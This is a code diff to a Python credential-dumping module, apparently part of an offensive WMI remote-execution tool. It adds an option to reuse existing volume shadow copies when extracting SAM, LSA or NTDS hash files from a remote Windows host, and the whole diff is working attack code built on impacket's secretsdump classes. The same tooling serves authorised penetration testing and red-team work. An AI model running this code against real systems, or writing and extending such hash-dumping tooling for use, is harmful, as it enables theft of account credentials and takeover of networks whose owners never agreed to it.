@@ -3,6 +3,7 @@ import uuid
 import base64
 import time
 import os
+from datetime import datetime
 
 from lib.helpers import get_vbs
 from lib.methods.executeScript import executeScript_Toolkit
@@ -13,7 +14,7 @@ from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets
 
 
 class Hashdump():
-    def __init__(self, iWbemLevel1Login, dumpType):
+    def __init__(self, iWbemLevel1Login, dumpType, use_existing_shadow_copy):
         self.iWbemLevel1Login = iWbemLevel1Login
         self.executer = executeScript_Toolkit(self.iWbemLevel1Login)
         self.hostname = self.iWbemLevel1Login._INTERFACE__target
@@ -38,6 +39,8 @@ class Hashdump():
                 "directory": "\\Windows\\NTDS\\"
             }
         }[self.dumpType]
+        self.use_existing_shadow_copy = use_existing_shadow_copy
+        self.shadow_copy_list = []
 
     def hashdump(self):
         if not os.path.exists(self.save_Path):
@@ -52,9 +55,56 @@ class Hashdump():
             return_iWbemServices=True
         )
 
-        shadow_id, device_object = self._create_shadow_copy()
-        if not shadow_id:
-            return False
+        shadow_id, device_object = None, None
+        existing_shadow_copy_selected = False
+
+        # Check for existing shadow copies if the user wants to reuse them
+        if self.use_existing_shadow_copy:
+            self._check_existing_shadow_copy()
+
+            if len(self.shadow_copy_list) > 0:
+                input_choice = None
+                
+                while input_choice not in ['y', 'n']:
+                    input_choice = input("Do you want to use an existing shadow copy? (y/n): ").strip().lower()
+                    if input_choice == 'y':
+                        # Prompt the user to select a shadow copy from the list
+                        input_index = None
+                        while input_index is None:
+                            try:
+                                input_index = int(input(f"Select the shadow copy to use (0-{len(self.shadow_copy_list)-1}): ").strip())
+                                if input_index < 0 or input_index >= len(self.shadow_copy_list):
+                                    self.logger.error("Invalid index. Please try again.")
+                                    input_index = None
+                            except ValueError:
+                                self.logger.error("Invalid input. Please enter a number.")
+                                input_index = None
+                        selected_shadow_copy = self.shadow_copy_list[input_index]
+                        shadow_id = selected_shadow_copy.ID
+                        device_object = selected_shadow_copy.DeviceObject
+
+                        existing_shadow_copy_selected = True
+                        self.logger.info(f"Using existing shadow copy: {shadow_id} with device object: {device_object}")
+            else:
+                self.logger.info("No existing shadow copies found. Creating a new one.")
+                input_choice = None
+                
+                while input_choice not in ['y', 'n']:
+                    input_choice = input("Do you want to create a new temporary shadow copy? (y/n): ").strip().lower()
+                    if input_choice == 'n':
+                        self.logger.info("Exiting hashdump process as no shadow copy is available.")
+                        return False
+
+        self.logger.info("Starting hashdump process...")
+
+        # If no existing shadow copy is selected or found, create a new one
+        if not existing_shadow_copy_selected:
+            self.logger.info("Creating a new shadow copy.")
+            shadow_id, device_object = self._create_shadow_copy()
+
+            # If shadow copy creation fails, exit the process
+            if not shadow_id:
+                return False
 
         # I have been research this for a long time, "ADODB.Stream" can't read "\\?\"" directly
         # But thankfully, after reading the post: https://medium.com/@WaterBucket/understanding-path-resolution-in-windows-70054c446b3b
@@ -68,7 +118,52 @@ class Hashdump():
 
         self._parse_hashes()
 
-        self._cleanup_shadow_copy(shadow_id)
+        if not existing_shadow_copy_selected:
+            self._cleanup_shadow_copy(shadow_id)
+
+    def _check_existing_shadow_copy(self):
+        try:
+            shadowcopy_instances = self.iWbemServices_cimv2.ExecQuery("SELECT DeviceObject, ID, InstallDate FROM Win32_ShadowCopy")
+            shadow_copy_list_raw = []
+            while True:
+                try:
+                    # Fetch next WMI object instance from the stream
+                    # There could be duplicate instances, so we need to check if it's already in the list before adding it
+                    # Then sort the list by InstallDate in descending order after all instances are fetched
+                    instance = shadowcopy_instances.Next(0xffffffff, 1)
+                    if isinstance(instance, list) and len(instance) > 0:
+                        shadow_copy_list_raw.extend(instance)
+                    else:
+                        shadow_copy_list_raw.append(instance)
+
+                    if len(shadow_copy_list_raw) > 0:
+                        for data in shadow_copy_list_raw:
+                            if data not in self.shadow_copy_list:
+                                self.shadow_copy_list.append(data)
+                    else:
+                        self.logger.info("[-] No existing shadow copies found")
+                    
+                except Exception as e:
+                    if "S_FALSE" in str(e):
+                        break
+                    raise e
+            
+            # Sort and print
+            self.shadow_copy_list.sort(key=lambda x: x.InstallDate, reverse=True)
+            for idx, data in enumerate(self.shadow_copy_list):
+                try:
+                    # Extract just the YYYYMMDDHHMMSS portion (first 14 characters)
+                    clean_date = datetime.strptime(data.InstallDate[:14], "%Y%m%d%H%M%S").strftime("%Y-%m-%d %H:%M:%S")
+                except Exception:
+                    clean_date = data.InstallDate  # Fallback if the string formatting deviates
+                
+                self.logger.info("[%d] Found: %s", idx, data.DeviceObject)
+                self.logger.info("    └── ID:   %s", data.ID)
+                self.logger.info("    └── Date: %s UTC", clean_date)
+        except Exception as e:
+            self.logger.error(f"Error checking existing shadow copies: {e}")
+        
+        return
 
     def _create_shadow_copy(self):
         try:
@@ -126,7 +221,7 @@ class Hashdump():
             else:
                 if os.path.exists(saved) and os.path.getsize(saved) > 0:
                     size = os.path.getsize(saved)
-                    self.logger.log(100, f"Save {filename} to {saved.upper()}, size: {size} bytes")
+                    self.logger.log(100, f"Saved {filename} to {saved.upper()}, size: {size} bytes")
                 else:
                     self.logger.error(f"Failed to download {filename}")
                     return False
